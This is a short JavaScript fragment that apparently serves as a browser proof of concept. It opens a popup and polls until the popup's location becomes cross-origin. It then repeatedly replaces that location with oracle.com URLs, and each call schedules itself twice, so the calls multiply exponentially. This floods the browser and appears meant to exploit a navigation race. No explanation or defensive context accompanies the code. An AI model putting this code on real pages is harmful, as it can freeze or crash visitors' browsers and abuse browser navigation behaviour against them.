        function next()
        {
                w.location.replace('http://www.oracle.com/index.html?'+n);n++;
                setTimeout("next();",15);
                setTimeout("next();",25);
        }
        function f()
        {
                w=window.open("content.html","_blank","width=500 height=500");
                i=setInterval("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",5);
        }
    